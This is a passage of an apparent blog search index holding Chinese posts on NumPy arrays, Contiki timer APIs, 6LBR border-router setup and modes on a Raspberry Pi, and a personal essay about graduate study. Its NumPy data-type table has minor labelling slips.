        <tag>Numpy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python Numpy学习笔记（一）]]></title>
    <url>%2F2017%2F04%2F14%2FPython-Numpy%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[Python科学计算库：Numpy。本博客简单介绍了Numpy的安装，主要介绍了Numpy提供的数组对象ndarray的创建、属性与数据类型。 简介 Numpy是Python的一个开源科学计算的库，提供了矩阵运算的功能，其一般与Scipy、matplotlib一起使用。 NumPy提供了两种基本的对象：ndarray（N-dimensional array object）和 ufunc（universal function object）。ndarray(下文统一称之为数组)是存储单一数据类型的多维数组，而ufunc则是能够对数组进行处理的函数。 安装1pip install numpy 测试12import numpy as npprint np.version.version ndarrayndarray是一个多维数组对象，由两部分构成： 实际的数据 描述这些数据的元数据（数据维度、数据类型等） ndarray数组一般要求所有元素类型相同（同质），数组下标从0开始 在NumPy中数组的维度(dimensions)叫做轴(axis)，轴的个数叫做秩(rank)。 创建ndarray 从Python中的列表、元组等类型创建ndarray数组 可以使用np.array()方法将Python列表或元组转化为数组，转化后的数组元素的类型由原来的对象的类型来决定。 （1）一维数组 123&gt;&gt;&gt; import numpy as np&gt;&gt;&gt; np.array((1, 2, 3, 4)) #从元组创建array([1, 2, 3, 4]) （2）多维数组 123456&gt;&gt;&gt; np.array([[1, 2, 3, 4],[5, 6, 7, 8]]) #从列表创建array([[1, 2, 3, 4], [5, 6, 7, 8]])&gt;&gt;&gt; np.array([[1, 2, 3, 4],(5, 6, 7, 8)]) #从列表和元组混合类型创建array([[1, 2, 3, 4], [5, 6, 7, 8]]) 当np.array()不指定dtype时，NumPy将根据数据情况关联一个dtype类型。 使用NumPy中函数创建ndarray数组，如：arange, ones, zeros等 函数 说明 np.arange(n) 类似range()函数，返回ndarray类型，元素从0到n‐1 np.ones(shape) 根据shape生成一个全1数组，shape是元组类型 np.zeros(shape) 根据shape生成一个全0数组，shape是元组类型 np.full(shape,val) 根据shape生成一个数组，每个元素值都是val np.eye(n) 创建一个正方的n*n单位矩阵，对角线为1，其余为0 np.ones_like(a) 根据数组a的形状生成一个全1数组 np.zeros_like(a) 根据数组a的形状生成一个全0数组 np.full_like(a,val) 根据数组a的形状生成一个数组，每个元素值都是val np.linspace() 根据起止数据等间距地填充数据，形成数组 np.concatenate() 将两个或多个数组合并成一个新的数组 12345678910111213141516171819202122&gt;&gt;&gt; import numpy as np&gt;&gt;&gt; np.arange(6)array([0, 1, 2, 3, 4, 5])&gt;&gt;&gt; np.ones(6)array([ 1., 1., 1., 1., 1., 1.])&gt;&gt;&gt; np.zeros((3,2))array([[ 0., 0.], [ 0., 0.], [ 0., 0.]])&gt;&gt;&gt; np.full((2,2),6)array([[6, 6], [6, 6]])&gt;&gt;&gt; np.eye(3) array([[ 1., 0., 0.], [ 0., 1., 0.], [ 0., 0., 1.]])&gt;&gt;&gt; a = np.array([[1,2],[2,1]]) &gt;&gt;&gt; np.ones_like(a) #生成一个与a数组相同结构的全1数组array([[1, 1], [1, 1]])&gt;&gt;&gt; np.linspace(1, 10, 6) # 1为起始数，10为终止数，6为数的个数array([ 1. , 2.8, 4.6, 6.4, 8.2, 10. ]) ndarray的属性 shape：一个说明ndarray对象各维度大小的元组 对一个n 行m 列的矩阵来说，shape为 (n,m)。 1234567891011121314151617&gt;&gt;&gt; import numpy as np&gt;&gt;&gt; c = np.array([1, 2, 3, 4])&gt;&gt;&gt; c.shape(4,)&gt;&gt;&gt; c.shape = 2, 2&gt;&gt;&gt; carray([[1, 2] [3, 4]])&gt;&gt;&gt; k = c.reshape(4,)&gt;&gt;&gt; karray([1, 2, 3, 4])&gt;&gt;&gt; k[0] = 0&gt;&gt;&gt; karray([0, 2, 3, 4])&gt;&gt;&gt; carray([[0, 2] [3, 4]]) 使用数组的reshape方法，可以创建一个改变了尺寸的新数组，原数组的shape保持不变。 注意：k与c共享内存区域，所以修改其中任意一个数组的元素都会同时修改另外一个数组的内容。 dtype：ndarray对象的元素类型 数组的元素类型可以通过dtype属性获得，可以通过dtype参数在创建时指定元素类型。 类型可以是 numpy.int32, numpy.int16, and numpy.float64 等。 123&gt;&gt;&gt; c = np.array([[1, 2, 3, 4],[5, 6, 7, 8]])&gt;&gt;&gt; c.dtypedtype(&apos;int32&apos;) 创建数组时也可以指定元素的数据类型: 123&gt;&gt;&gt;np.array([[1,2,3,4],[5, 6, 7, 8]], dtype = np.float)array([[ 1., 2., 3., 4.], [ 5., 6., 7., 8.]]) ndim：数组的维数，也称为rank(秩) 123&gt;&gt;&gt; c = np.array([[1, 2, 3, 4],[5, 6, 7, 8]])&gt;&gt;&gt; c.ndim2 size：ndarray对象元素的个数 123&gt;&gt;&gt; c = np.array([[1, 2, 3, 4],[5, 6, 7, 8]])&gt;&gt;&gt; c.size8 itemsize：ndarray对象中每个元素的大小，即占用的字节数。 123&gt;&gt;&gt; c = np.array([[1, 2, 3, 4],[5, 6, 7, 8]])&gt;&gt;&gt; c.itemsize4 data：指向数据内存。 123&gt;&gt;&gt; c = np.array([[1, 2, 3, 4],[5, 6, 7, 8]])&gt;&gt;&gt; c.data&lt;read-write buffer for 0x02D89E30, size 32, offset 0 at 0x02CE7DE0&gt; ndarray的数据类型 Python语法仅支持整数、浮点数和复数3种类型，而ndarray支持多种数据类型，这也正是其用于科学计算的强大之处。 类型 说明 bool 布尔类型，True或False intc 与C语言中的int类型一致，一般是int32或int64 intp 用于索引的整数，与C语言中ssize_t一致，int32或int64 int8 字节长度的整数，取值：[‐128, 127] int16 16位长度的整数，取值：[‐32768, 32767] int32 32位长度的整数，取值：[‐2^31,2^31‐1] int64 64位长度的整数，取值：[‐2^63,2^63‐1] uint8 8位无符号整数，取值：[0, 255] uint16 16位无符号整数，取值：[0, 65535] uint32 32位无符号整数，取值：[0,2^32‐1] uint64 32位无符号整数，取值：[0,2^64‐1] float16 16位半精度浮点数：1位符号位，5位指数，10位尾数 float32 32位半精度浮点数：1位符号位，8位指数，23位尾数 float64 64位半精度浮点数：1位符号位，11位指数，52位尾数 complex64 复数类型，实部和虚部都是32位浮点数 complex128 复数类型，实部和虚部都是64位浮点数]]></content>
      <categories>
        <category>Programming language</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Numpy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Contiki 定时器部分详解]]></title>
    <url>%2F2017%2F04%2F06%2FContiki-%E5%AE%9A%E6%97%B6%E5%99%A8%E9%83%A8%E5%88%86%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[Contiki有一个clock模块和一系列timer模块：timer，stimer，ctimer，etimer，和rtimer。 contiki的定时器种类太多，在初期会让人有一种分不清的感觉。都是以timer（硬件定时器）为基础拓展成软件的定时器方式，有的以事件方式、有的以回调方式，有的通过粗精度来保证软件的低消耗，可以通过功能的划分来选择不同的定时器。 Clock模块clock.h位于contiki/core/sys。该文件为内核文件，定义了clock模块实现的接口和必要条件。 clock_init()函数 就是初始化系统时钟。 clock_time()函数 函数就是计时函数，直接返回count的值，这样就知道当前时间了。 clock_seconds()函数 函数返回以秒为单位的数值seconds。该全局变量在时钟中断函数中，每当count值为128时，都会加1，相当于每增加1都经过了1秒。 clock_delay()和clock_wait()函数 用来阻塞CPU的，但不会放弃控制权，就是平常的延时函数，有的底层驱动可能会需要。 CLOCK_SECOND宏就是一秒的宏，该宏值乘以7.8ms应该是1s，所以程序里面设置该宏值为128，这样，128 * 7.8 = 998.4≈1S。 有clock.h必有clock.c，该文件与具体的硬件平台有关，它可以位于contiki/cpu/下，也可以位于contiki/platform/下。 Timer定时器简介 Timer定时器以clock的tick作为时间精度，它是Contiki系统最基础的定时器，它使用Contiki系统时钟模块中的clock_time()函数来获取系统当前时间以便实现定时功能，等待时间到达以后触发，需要轮询调用，即应用程序必须去主动检查定时器是否过期,不能自动的的获得过期的消息。clock模块提供一些处理系统时间的函数，还有一些用来阻塞CPU的函数。 定时器API定义/home/user/contiki/core/sys/timer.h 123456789101112131415161718192021222324252627#ifndef TIMER_H_#define TIMER_H_#include &quot;sys/clock.h&quot;/** * 定义一个Timer定时器对象。定时器在使用之前必须通过timer_set()进行设置。 */struct timer &#123; clock_time_t start; clock_time_t interval;&#125;;//设置并启动一个Timer定时器对象CCIF void timer_set(struct timer *t, clock_time_t interval);//复位一个Timer定时器对象void timer_reset(struct timer *t);//重启一个Timer定时器对象void timer_restart(struct timer *t);//检查一个Timer定时器对象是否到期CCIF int timer_expired(struct timer *t);//获取一个Timer定时器对象距离所设置的到期时长还剩余多少时间clock_time_t timer_remaining(struct timer *t);#endif /* TIMER_H_ */ API的具体实现位于/home/user/contiki/core/sys目录下的timer.c文件中。 Stimer简介 设定定时器，以second作为时间精度，等待时间到达以后触发，需要轮询调用。实际上stimer这个模块跟timer的用法，及API的功能完全一致，只不过timer定时us级别的时间，stimer定时s级别的时间。 定时器API定义/home/user/contiki/core/sys/stimer.h 123456789101112131415161718192021222324252627#ifndef STIMER_H_#define STIMER_H_#include &quot;sys/clock.h&quot;/** * 定义一个Stimer定时器对象。定时器在使用之前必须通过stimer_set()进行设置。 */struct stimer &#123; unsigned long start; unsigned long interval;&#125;;// 设置并启动一个Stimer定时器对象void stimer_set(struct stimer *t, unsigned long interval);// 重置一个Stimer定时器对象void stimer_reset(struct stimer *t);// 重启一个Stimer定时器对象void stimer_restart(struct stimer *t);// 检查一个Timer定时器对象是否到期int stimer_expired(struct stimer *t);// 获取一个Timer定时器对象距离所设置的到期时长还剩余多少时间unsigned long stimer_remaining(struct stimer *t);// 得到定时器启动后的时间unsigned long stimer_elapsed(struct stimer *t);#endif /* STIMER_H_ */ API的具体实现位于/home/user/contiki/core/sys目录下的stimer.c文件中。 Etimer简介 事件定时器，调用clock_time获得当前系统的时间，它提供产生时间事件（timed event）的机制，当设定好的定时器到期时将会给绑定定时器的线程发送一个PROCESS_EVENT_TIMER 事件； contiki系统可以使用这个定时器做事件调度，主要用在contiki进程当系统的其它功能工作或休眼时，这个进程在等待一个时钟周期。Rime协议栈里面会经常用来处理通信超时。 定时器API定义/home/user/contiki/core/sys/etimer.h 1234567891011121314151617181920212223242526272829303132333435363738#ifndef ETIMER_H_#define ETIMER_H_#include &quot;sys/timer.h&quot;#include &quot;sys/process.h&quot;// 定义一个Etimer定时器对象，定时器在使用之前必须通过etimer_set()进行设置。struct etimer &#123; struct timer timer; struct etimer *next; struct process *p;&#125;;// 设置并启动一个Etimer定时器对象CCIF void etimer_set(struct etimer *et, clock_time_t interval);// 重置一个Etimer定时器对象CCIF void etimer_reset(struct etimer *et);// 重启一个Etimer定时器对象void etimer_restart(struct etimer *et);// 获取事件定时器的过期时间。void etimer_adjust(struct etimer *et, int td);// 获取事件定时器的到期时间clock_time_t etimer_expiration_time(struct etimer *et);// 获取事件定时器的启动时间clock_time_t etimer_start_time(struct etimer *et);// 检查一个Etimer定时器对象是否到期CCIF int etimer_expired(struct etimer *et);// 停止一个Etimer定时器对象void etimer_stop(struct etimer *et);// 通知事件定时器时钟已更改void etimer_request_poll(void);// 检查是否有任何非过期的事件定时器int etimer_pending(void);// 所有即将到期的事件定时器的下一个到期时间clock_time_t etimer_next_expiration_time(void);PROCESS_NAME(etimer_process);#endif /* ETIMER_H_ */ API的具体实现位于/home/user/contiki/core/sys目录下的etimer.c文件中。 Ctimer简介 回调定时器，调用etimer，触发以后调用回调函数； 由于Ctimer同样也是事件定时器，只不过多了一个回调的功能，所以在初始化Ctimer时，用etimer_set来初始化系统启动时需要的Ctimer，然后标记初始化完成。在ctimer_process中，主要是去轮询过期的Ctimer，然后再进行回调。请注意,由于回调函数在另一个进程中,所以根据protothread的设计，需要调用 PROCESS_CONTEXT_BEGIN()和PROCESS_CONTEXT_END()来临时的开辟其它进程中的上下文，最后关闭。（可参考ctimer_process的具体实现进行分析） 定时器API定义/home/user/contiki/core/sys/ctimer.h 12345678910111213141516171819202122232425262728#ifndef CTIMER_H_#define CTIMER_H_#include &quot;sys/etimer.h&quot;// 定义一个Ctimer定时器对象struct ctimer &#123; struct ctimer *next; struct etimer etimer; struct process *p; void (*f)(void *); void *ptr;&#125;;// 复位一个Ctimer定时器对象void ctimer_reset(struct ctimer *c);// 重启一个Ctimer定时器对象void ctimer_restart(struct ctimer *c);// 设置并启动一个Ctimer定时器对象void ctimer_set(struct ctimer *c, clock_time_t t, void (*f)(void *), void *ptr);// 停止一个Ctimer定时器对象void ctimer_stop(struct ctimer *c);// 检查一个Ctimer定时器对象是否到期int ctimer_expired(struct ctimer *c);// 初始化Ctimer定时器void ctimer_init(void);#endif /* CTIMER_H_ */ API的具体实现位于/home/user/contiki/core/sys目录下的ctimer.c文件中。 rtimer 实时定时器，直接调用硬件平台，设定一个硬件实时定时器，触发以后调用一个定时器回调。它可以抢占任何进程，这样使得实时任务可以准确调度。 有两种类型的实时任务：一种是硬实时任务，一种是软实时任务，其中硬实时任务的优先级要高点。 rtimer与其它的timer不一样的是，它在平台这一层只是提供了三个接口： rtimer_init rtimer_set rtimer_run_next 这三个接口的实现是严重依赖于MCU的特性的。 定时器API定义/home/user/contiki/core/sys/rtimer.h 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#ifndef RTIMER_H_#define RTIMER_H_#include &quot;contiki-conf.h&quot;#ifndef RTIMER_CLOCK_LTtypedef unsigned short rtimer_clock_t;#define RTIMER_CLOCK_LT(a,b) ((signed short)((a)-(b)) &lt; 0)#endif /* RTIMER_CLOCK_LT */#include &quot;rtimer-arch.h&quot;void rtimer_init(void);struct rtimer;typedef void (* rtimer_callback_t)(struct rtimer *t, void *ptr);// 定义一个Ctimer定时器对象struct rtimer &#123; rtimer_clock_t time; rtimer_callback_t func; void *ptr;&#125;;enum &#123; RTIMER_OK, RTIMER_ERR_FULL, RTIMER_ERR_TIME, RTIMER_ERR_ALREADY_SCHEDULED,&#125;;// 设置并启动一个rtimer定时器对象int rtimer_set(struct rtimer *task, rtimer_clock_t time, rtimer_clock_t duration, rtimer_callback_t func, void *ptr);void rtimer_run_next(void);// 用于获取当前的rtimer时间#define RTIMER_NOW() rtimer_arch_now()#define RTIMER_TIME(task) ((task)-&gt;time)// 针对特定平台的初始化操作，被rtimer_init()函数调用void rtimer_arch_init(void);// 传递一个唤醒时间，在特定时刻进行调度操作，调用rtimer_run_next()void rtimer_arch_schedule(rtimer_clock_t t);/*rtimer_clock_t rtimer_arch_now(void);*/// rtimer每秒的滴答数#define RTIMER_SECOND RTIMER_ARCH_SECOND#endif /* RTIMER_H_ */ API的具体实现位于/home/user/contiki/core/sys目录下的rtimer.c文件中。]]></content>
      <categories>
        <category>IoT</category>
        <category>Contiki</category>
      </categories>
      <tags>
        <tag>［IoT,Contiki,timer］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Raspberry Pi 6LBR配置教程]]></title>
    <url>%2F2017%2F03%2F31%2FRaspberry-Pi-6LBR%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[6LBR 是目前国际上较为优秀的基于 Contiki 系统的 6LoWPAN 边界路由器解决方案。和现有的其他边界路由器方案相比，6LBR 是唯一一个不需要 Linux 主机的独立边界路由器，并且能够提供IPv6/NDP 和 RPL 之间的智能互联。 本文介绍了如何在Raspberry Pi上配置6LBR。 下载安装下载6LBR12345$ git clone https://github.com/cetic/6lbr$ cd 6lbr$ git submodule update --init --recursive$ cd examples/6lbr$ git checkout develop-1.4.1 #根据6LBR项目的版本修改版本号，目前稳定版为1.4.1 编译6LBR123$ make all #如果要使用1.4以下版本，只要把命令改为make TARGET=native all即可$ make plugins$ make tools 安装6LBR123$ make install$ make plugins-install$ update-rc.d 6lbr defaults 注意：建议安装稳定版本，低于1.4的版本有些功能好像不支持，比如NAT64，而最新版本则亲测不稳定。 6LBR配置 默认情况下6LBR是没有配置文件的，只是在/etc/6lbr/目录下给了几个例子，我们需要自己新建conf.d文件。 配置6LBR模式 配置为路由器模式，在/etc/6lbr/conf.d文件夹下： 1MODE=ROUTER 接口配置 你需要在你的 /etc/6lbr/6lbr.conf 文件中进行如下配置（我们假设你的以太网接口是eth0）： 123456RAW_ETH=0BRIDGE=1CREATE_BRIDGE=0DEV_ETH=eth0DEV_BRIDGE=br0DEV_TAP=tap0 你还需要创建一个桥接接口br0，在 /etc/6lbr 目录下，我们提供了两个/etc/network/interfaces 文件的例子。例如，如果你使用DHCP，文件的内容应该是： 12345678910111213...iface eth0 inet staticaddress 0.0.0.0auto br0iface br0 inet dhcp bridge_ports eth0 bridge_stp off up echo 0 &gt; /sys/devices/virtual/net/br0/bridge/multicast_snooping post-up ip link set br0 address `ip link show eth0 | grep ether | awk &apos;&#123;print $2&#125;&apos;`... SLIP-RADIO配置接线说明 使用USB转TTL模块，将Raspberry Pi与SLIP-Radio（即一个contiki节点，使用cc538dk）连接起来。 编译程序12$ cd 6lbr/example/$ make TARGET=cc2538dk 得到bin或者hex文件，用于下一步的烧录。 烧写程序 cc2538dk程序烧写步骤请参考博客：Contiki CC2538dk 串口下载程序 启动6LBR1$ service 6lbr start 节点配置 节点我们暂时采用6LBR提供的demo进行测试，该demo位于6lbr-develop/examples/6lbr-demo，后续博客在讲解如何进行移植。 编译程序12$ cd examples/6lbr-demo$ make TARGET=cc2538dk 得到bin或者hex文件，用于下一步的烧录。 烧写程序 cc2538dk程序烧写步骤请参考博客：Contiki CC2538dk 串口下载程序 效果测试 你需要找一台与你的树莓派在同一个局域网的电脑，将其IPv6地址设定为bbbb::101，然后打开浏览器访问bbbb::100，即可看到6LBR的配置界面。可以在网页端对网络进行各种配置，具体教程后续博客会介绍，这里不展开了。6lbr提供的demo默认都是支持RPL的，所以我们可以使用几个节点，然后组成如下的传感网络。]]></content>
      <categories>
        <category>IoT</category>
      </categories>
      <tags>
        <tag>［IoT,6LBR,6LoWPAN］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[心之所向，素履以往]]></title>
    <url>%2F2017%2F03%2F27%2F%E5%BF%83%E4%B9%8B%E6%89%80%E5%90%91%EF%BC%8C%E7%B4%A0%E5%B1%A5%E4%BB%A5%E5%BE%80%2F</url>
    <content type="text"><![CDATA[凡心所向，素履所往，生如逆旅，一苇以航。 －－－七堇年《尘曲》 很久很久没有写过关于Life的博客了吧，或许真的是因为我懒，又或许如此安静平凡的生活真的没什么可写的，但是既然兴致来了，那就写写吧。 来中南学习已经一个半月了，谈谈感受吧。提前来体验研究生生活是我自己的选择，对于这个选择我一直都坚信是正确的，现在想想也确实收获不小。提前来这边有两个目的，一是完成毕业设计，二是熟悉研究生阶段将要研究的方向。目前看来，虽然遇到很多困难，但是二者都在稳步前进。 在这边相对自由，没有那么多的约束，但是学习的氛围却很浓，导师和师兄师姐也都很好，所以也很快适应了这边的生活。其实，真的没说错，越好的学校学习气氛越好。原以为自己已经够努力了，来到这边才知道什么叫努力，特别佩服博士师兄，每天到得早回得晚，做的事情也多。没有太多的约束，也没有老师天天管着，但是大家都会很自觉地在实验室学习，我也慢慢习惯在实验室待一整天的生活。 最近很认同朋友说的一句话：出了社会才知道自己根本不算什么。确实啊，来到这边自己也是很有压力的，尽管你在原来的学校可能已经是比较厉害的了，可是来到这里你才发现什么叫做差距，确实还有很多需要努力的地方，但是我也相信，我还有时间可以赶得上。 在这边最喜欢的应该是每周的交流与讨论了，其实自己早就很向往这种学术沙龙式的交流活动。每周的组会，说不上多么高大上，但是自己的汇报以及导师和师兄师姐的提问，都会带来一些思考。期间还经历了两次论文分享，自己也分享了一次。论文分享就是先自己去读比较新的文章，然后做PPT给大家汇报文章的内容，然后大家针对文章进行提问展开讨论。从一开始不知道如何提问，到慢慢参与他们的讨论，我发现每一次论文分享都是思维的碰撞。我分享的那次讲得确实不好，总结下来，一方面是自己给自己太大的压力以及自己的不自信，另一方面是自己对TCP/IP体系结构的很多协议与实现机制没有深入的认识。另外，我也在尝试着参与师兄师姐的项目，和他们一起讨论解决方案，虽然每次都觉得没帮上什么忙，但是他们的思路以及互相的讨论也给了我不少的启发。 说实话，真的特别特别喜欢这样的学习交流，每次的讨论都会带来很多问题，然后就可以带着问题去寻找答案，所以说，每周除了做毕设，还要尝试着去解决一些问题，这也是每天都过得还算充实的原因。 让我突然觉得自己有所收获的是最近回本科学校，拿着毕业设计的前两章内容给老师看，他说这样写不行，我把本科生论文写成研究生论文了，突然意识到，这或许就是这段时间的进步吧。这边导师强调做毕设得过程中多了解网络协议，这就是和本科的区别啊，本科往往注重的是如果实现一个设计，而研究生则不仅仅满足于此，因为还要做研究，那么其中的协议就要搞得清清楚楚，甚至还要去优化协议。让我开心的是，我也竟然也开始有了这种思维，而不仅仅局限于如何去实现我的设计。 这段时间除了实验室的学习，依然也有自己的生活，看了不少的纪录片，关于社会、关于生命、关于旅行、关于历史等等，很多精彩的纪录片真的值得去看，也值得去思考。当然，也依然在坚持做一直觉得重要的事情，也就是写写博客，学学自己想学的，总之，一切都那么简单那么平静。 近来，自己的博客也慢慢得到一些人的喜欢，也有一些朋友通过博客来加好友，很难得能够和这些有共同兴趣爱好的朋友一起交流一起进步，这或许也是写博客的意义吧。这段时间我也回学校好几次，去拜访过老师，也去给实验室的学弟学妹做过分享，也去见过老友。很开心的是，室友也都找到工作了，只是突然发现，真的真的马上就要毕业了。上次还说，现在回去还能有地方睡，想着以后在农大就没有一张床随时给我备着了。莫名的伤感啊，大学四年，马上，大家就要各奔东西了。 写着写着就有写到毕业去了，这件事真的不能多想，一想就停不下来，还是就此打住吧。最近特别喜欢希望一句话：心之所向，素履以往。不管是目前还在努力前进的自己还是最近参加研究生复试的朋友、接下来还要找工作或者考公务员的朋友，我想大家都是在追逐梦想，所以，希望大家加油，也希望大家都能如愿。 时间不早了，零零散散写了很多，我不是一个好的作者，但是有空我还是会再写写Life的。]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[6LoWPAN Border Router：6LBR 接口配置]]></title>
    <url>%2F2017%2F03%2F21%2F6LoWPAN-Border-Router%EF%BC%9A6LBR-%E6%8E%A5%E5%8F%A3%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[6LBR 系列博文之（二） - 6LBR 接口配置。 注意：本文只与基于Linux的6LBR有关。 在Linux平台上，你需要将6LBR应用程序链接到你的LAN网络，为此，你有三种可能性。（为了使清晰起见，您可以假设6LBR是在Linux主机上运行的VM） 以太网直连 这是最简单的方法，但也是最有限的一种，您的Linux主机将无法直接与6LBR和WSN通信。如名称所示，6LBR直接使用配置的以太网接口发送和接收数据包。 你需要在你的 /etc/6lbr/6lbr.conf 文件中进行如下配置（我们假设你的以太网接口是eth0）： 123RAW_ETH=1BRIDGE=0DEV_ETH=eth0 桥接模式 此模式需要更多配置，但是你将能够与Linux主机的6LBR通信。在这种模式下，6LBR将创建一个虚拟以太网接口，通常为tap0。您需要将其桥接到以太网接口，以提供连接。创建的桥接接口将替换您的以太网接口用于所有目标。 重要的提示：你的以太网驱动程序必须支持混杂模式，如果不能，桥将无法正常工作，你将与6LBR间歇性连接。 Beaglebone的以太网驱动程序不支持混杂模式！ 你需要在你的 /etc/6lbr/6lbr.conf 文件中进行如下配置（我们假设你的以太网接口是eth0）： 123456RAW_ETH=0BRIDGE=1CREATE_BRIDGE=0DEV_ETH=eth0DEV_BRIDGE=br0DEV_TAP=tap0 你还需要创建一个桥接接口br0，在 /etc/6lbr 目录下，我们提供了两个/etc/network/interfaces 文件的例子。例如，如果你使用DHCP，文件的内容应该是： 12345678910111213...iface eth0 inet staticaddress 0.0.0.0auto br0iface br0 inet dhcp bridge_ports eth0 bridge_stp off up echo 0 &gt; /sys/devices/virtual/net/br0/bridge/multicast_snooping post-up ip link set br0 address `ip link show eth0 | grep ether | awk &apos;&#123;print $2&#125;&apos;`... 如你所见，以太网接口不再配置，它已被br0替换。 可以在6LBR启动时创建网桥，但是这样做的结果是，当以太网接口加入网桥时，你将丢失所有现有连接。如果你真的想要这种模式，你必须添加到你的6lbr.conf文件： 1CREATE_BRIDGE=1 路由模式 这种模式是最强大的，也是最复杂的。您不需要创建连接tap0接口和et0接口的网桥，而是依靠Linux主机栈来在两个接口之间进行路由，在IP级使用实际路由或以太网级使用ebtables。这只有在有多个接口或复杂路由时，或者当您的以太网驱动程序不支持混杂模式时才有用。 6lbr.conf 文件的配置很简单： 1234RAW_ETH=0BRIDGE=0DEV_ETH=eth0DEV_TAP=tap0 可以通过在/etc/sysctl.conf中添加以下两行来启用IP转发： 12net.ipv4.ip_forward = 1net.ipv6.conf.all.forwarding=1 为了避免在tap0和eth0接口之间有一个不必要的子网，最好使用没有前缀自动配置的SmartBridge模式。 遇到的问题 使用桥接模式时，树莓派ip地址经常跳变，解决办法： 当接口添加到网桥时，其所有配置都将丢失。因此，当6LBR启动并将以太网接口添加到其网桥时，连接将丢失。解决方案是在系统引导时使用提供的接口示例文件（在/etc/6lbr/interfaces.*.example中）创建桥接，并在/etc/6lbr/6lbr.conf中设置CREATE_BRIDGE = 0。]]></content>
      <categories>
        <category>IoT</category>
        <category>6LoWPAN</category>
      </categories>
      <tags>
        <tag>［IoT,6LBR,6LoWPAN］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[6LoWPAN Border Router：6LBR之运行模式]]></title>
    <url>%2F2017%2F03%2F16%2F6LoWPAN-Border-Router%EF%BC%9A6LBR%E4%B9%8B%E8%BF%90%E8%A1%8C%E6%A8%A1%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[6LBR 系列博文之（一） - 6LBR 运行模式。 概述 6LBR可以在三种类别的模式中运行：网桥，路由器和透明网桥。这三个类别又被细分为以下模式： Bridge SmartBridge Router Router NDP-Router 6LR RPL-Root Transparent Bridge RPL-Replay FullTransparentBridge 网桥 在网桥模式中，只是实现了 802.15.4 接口和以太网接口的桥接，即根据链路层的地址进行网络数据包的转发。在网桥模式中，6LBR 又可分为智能网桥模式和透明网桥模式。 路由器 路由器模式能够实现 IPv6 网络和 6LoWPAN 网络之间真正的路由功能，它将无线传感器网络当作一个独立的子网，因此以太网和无线网的 IPv6 地址前缀不相同，以 6LBR 作为根节点的 RPL 实例管理整个无线传感器网络。 模式的详细介绍智能网桥模式 在这种模式下，6LBR充当智能桥，允许将标准的基于IPv6的网络与基于RPL的WSN Mesh网格互连。智能网桥在以太网端充当NDP代理并且使用NDP参数配置WSN Mesh网络。源和目地MAC地址被转换，系统能够解析数据包的源 MAC 地址和目的 MAC 地址，ICMPv6 包所包含的地址也会被解析出来。智能网桥模式允许你： 将WSN Mesh网络无缝集成到现有的基于NDP的IPv6网络中，智能网桥将使用NDP提供的配置来相应地设置WSN网格。 将多个WSN Mesh网络与自己DODAG聚合到一个虚拟的IPv6子网。支持节点移动性，在两个WSN重叠的情况下，如果一个节点获得更好的链路，它可以从一个WSN切换到另一个，如从虚拟IPv6子网看到的，由于NDP代理，该交换机将几乎不可见。 路由模式 在这种模式下，6LBR作为一个完全成熟的IPv6路由器，互连两个IPv6子网。WSN子网由RPL协议管理，以太网子网由IPv6 NDP管理。在这种模式下，6LBR通过包过滤器模块为Contiki提供了一个虚拟的第二接口。此模式更像是以太网和6Lowpan RPL之间的网关。来自RPL侧的传出报文的源地址将更新为eth_ip_local_addr。 在路由模式你可以： 将WSN网格隔离到其自己的子网中，因此可以清楚地标识WSN节点。 … 注意：前缀切换能力支持跨不同WSN子网的节点移动性，在这种情况下，节点将根据新WSN的前缀获得新地址。 透明网桥模式 在这些模式下，6LBR充当独立网桥，提供基本的交换功能。所有在以太网接口上定位到802.15.4接口的传入包或者传入的组播包被转发到WSN段。相反的，所有针对以太网接口的传入数据包或802.15.4接口上的传入组播数据包都将转发到以太网段。6LBR有自己的地址并作为主机。源和目标MAC地址被转换，ICMPv6数据包中存在的地址也被转换。 在透明桥接模式下你可以： 聚合子WSN网格合并为一个全局DODAG，由外部RPL根节点管理（使用RPL中继时）。 使用NDP桥接一个IPv6网络的一跳网格（当使用FullTransparentBridge时）。 使用IPv6网络桥接静态路由网格（使用FullTransparentBridge时）。 … 注意，我们故意省略标记控制流量的类型，因为RPL和NDP都在可能的用例中提及。 其他模式 以下三种模式在6lbr的官方文档中也未做出说明，有待进一步的工作。 NDP-Router RPL-Root 6LR 本文翻译自 6LBR 官方文档：https://github.com/cetic/6lbr/wiki/6LBR-Modes，向优秀的 CETIC-6LBR 项目致敬！]]></content>
      <categories>
        <category>IoT</category>
        <category>6LoWPAN</category>
      </categories>
      <tags>
        <tag>［IoT,6LBR,6LoWPAN］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[6LoWPAN Border Router：CETIC-6LBR介绍]]></title>
    <url>%2F2017%2F03%2F12%2F6LoWPAN-Border-Router%EF%BC%9ACETIC-6LBR%E4%BB%8B%E7%BB%8D%2F</url>
